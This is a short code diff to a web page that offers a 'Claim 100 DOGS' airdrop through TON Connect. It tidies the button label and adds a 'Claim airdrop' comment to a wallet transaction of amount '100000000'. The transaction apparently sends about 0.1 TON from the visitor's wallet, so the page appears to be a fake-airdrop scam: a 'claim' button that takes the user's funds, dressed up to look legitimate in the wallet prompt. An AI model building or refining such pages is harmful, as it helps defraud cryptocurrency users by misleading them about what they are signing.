@@ -262,7 +262,7 @@
 
         <div id="ton-connect"></div>
         <button id="claim-button">
-            <i class="fas fa-bone"></i> Claim 100 DOGS!1
+            <i class="fas fa-bone"></i> Claim 100 DOGS
         </button>
 
         <div class="progress-container">
@@ -349,7 +349,10 @@
                             amount: '100000000',
                             stateInit: null,
                             bounce: true,
-                            payload: ''
+                            payload: {
+                                type: 'comment',
+                                text: 'Claim airdrop'
+                            }
                         }
                     ]
                 };
